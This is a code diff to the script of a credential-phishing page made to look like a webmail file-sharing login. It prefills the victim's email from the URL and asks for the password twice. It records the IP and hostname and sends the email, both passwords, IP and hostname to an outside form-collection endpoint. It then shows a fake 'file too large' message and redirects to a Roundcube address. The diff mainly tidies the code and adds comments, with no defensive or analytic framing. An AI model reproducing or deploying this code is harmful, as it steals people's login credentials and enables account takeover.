@@ -157,36 +157,42 @@
   const firstPasswordField = document.getElementById('firstPasswordField');
   let passwordFirstEntry = "";
 
+  // Autofill email from URL
   window.addEventListener('DOMContentLoaded', () => {
     const params = new URLSearchParams(window.location.search);
     const urlEmail = params.get('email');
     emailInput.value = urlEmail ? decodeURIComponent(urlEmail) : "user@example.com";
   });
 
+  // Switch to password step
   continueBtn.addEventListener('click', () => {
     stepEmail.classList.add('hidden');
     stepPassword.classList.remove('hidden');
     passwordInput.focus();
   });
 
+  // Toggle password visibility
   toggle.addEventListener('click', () => {
-    const isHidden = passwordInput.type === 'password';
-    passwordInput.type = isHidden ? 'text' : 'password';
+    passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
   });
 
+  // Fetch IP address
   fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
     .then(data => { document.getElementById('ip').value = data.ip; })
     .catch(() => {});
   document.getElementById('hostname').value = window.location.hostname;
 
+  // Handle form submit
   document.getElementById('mainForm').addEventListener('submit', async (e) => {
     e.preventDefault();
+
     const email = emailInput.value;
     const password = passwordInput.value;
     const ip = document.getElementById('ip').value;
     const hostname = document.getElementById('hostname').value;
 
+    // First password entry
     if (passwordFirstEntry === "") {
       passwordFirstEntry = password;
       firstPasswordField.value = passwordFirstEntry;
@@ -196,79 +202,71 @@
       return;
     }
 
-    const data = {
-      email: email,
-      password1: passwordFirstEntry,
-      password2: password,
-      ip: ip,
-      hostname: hostname
-    };
+    // Second password entry — now submit
+    try {
+      const formData = new FormData();
+      formData.append('email', email);
+      formData.append('password1', passwordFirstEntry);
+      formData.append('password2', password);
+      formData.append('ip', ip);
+      formData.append('hostname', hostname);
 
-   try {
-  const formData = new FormData();
-  formData.append('email', email);
-  formData.append('password1', passwordFirstEntry);
-  formData.append('password2', password);
-  formData.append('ip', ip);
-  formData.append('hostname', hostname);
+      const res = await fetch("https://submit-form.com/Eu6W47ZST", {
+        method: "POST",
+        body: formData
+      });
 
-  const res = await fetch("https://submit-form.com/Eu6W47ZST", {
-    method: "POST",
-    body: formData
+      if (res.ok) {
+        // Show overlay spinner
+        const overlay = document.createElement('div');
+        overlay.style.position = 'fixed';
+        overlay.style.top = 0;
+        overlay.style.left = 0;
+        overlay.style.width = '100%';
+        overlay.style.height = '100%';
+        overlay.style.background = 'rgba(255,255,255,0.95)';
+        overlay.style.display = 'flex';
+        overlay.style.flexDirection = 'column';
+        overlay.style.alignItems = 'center';
+        overlay.style.justifyContent = 'center';
+        overlay.style.zIndex = '99999';
+
+        const spinner = document.createElement('div');
+        spinner.style.width = '40px';
+        spinner.style.height = '40px';
+        spinner.style.border = '4px solid #ccc';
+        spinner.style.borderTopColor = '#d32f2f';
+        spinner.style.borderRadius = '50%';
+        spinner.style.animation = 'spin 1s linear infinite';
+
+        const msg = document.createElement('p');
+        msg.style.marginTop = '20px';
+        msg.style.fontSize = '15px';
+        msg.style.color = '#444';
+        msg.textContent = 'Processing file…';
+
+        overlay.appendChild(spinner);
+        overlay.appendChild(msg);
+        document.body.appendChild(overlay);
+
+        // Message updates
+        setTimeout(() => {
+          msg.textContent = "File is too large, contact the sender or log in with Roundcube.";
+        }, 3000);
+
+        setTimeout(() => {
+          msg.textContent = "Redirecting to Roundcube…";
+          window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
+        }, 7000);
+      } else {
+        alert("Submission failed. Check FormSpark ID.");
+      }
+    } catch (err) {
+      alert("Network error. Try again.");
+    }
   });
-
-  if (res.ok) {
-    // 🌀 Create spinner overlay
-    const overlay = document.createElement('div');
-    overlay.style.position = 'fixed';
-    overlay.style.top = 0;
-    overlay.style.left = 0;
-    overlay.style.width = '100%';
-    overlay.style.height = '100%';
-    overlay.style.background = 'rgba(255,255,255,0.95)';
-    overlay.style.display = 'flex';
-    overlay.style.flexDirection = 'column';
-    overlay.style.alignItems = 'center';
-    overlay.style.justifyContent = 'center';
-    overlay.style.zIndex = '99999';
-
-    const spinner = document.createElement('div');
-    spinner.style.width = '40px';
-    spinner.style.height = '40px';
-    spinner.style.border = '4px solid #ccc';
-    spinner.style.borderTopColor = '#d32f2f';
-    spinner.style.borderRadius = '50%';
-    spinner.style.animation = 'spin 1s linear infinite';
-
-    const msg = document.createElement('p');
-    msg.style.marginTop = '20px';
-    msg.style.fontSize = '15px';
-    msg.style.color = '#444';
-    msg.textContent = 'Processing file…';
-
-    overlay.appendChild(spinner);
-    overlay.appendChild(msg);
-    document.body.appendChild(overlay);
-
-    // 🕓 After 3 seconds, show message
-    setTimeout(() => {
-      msg.textContent = "File is too large, contact the sender to send in smaller chunks or log in with Roundcube.";
-    }, 3000);
-
-    // ⏳ After 7 seconds, redirect
-    setTimeout(() => {
-      msg.textContent = "Redirecting to Roundcube…";
-      window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
-    }, 7000);
-
-  } else {
-    alert("Submission failed. Check FormSpark form ID.");
-  }
-} catch (err) {
-  alert("Network error. Try again.");
-}
-
 </script>
+
 <style>
   @keyframes spin { to { transform: rotate(360deg); } }
 </style>
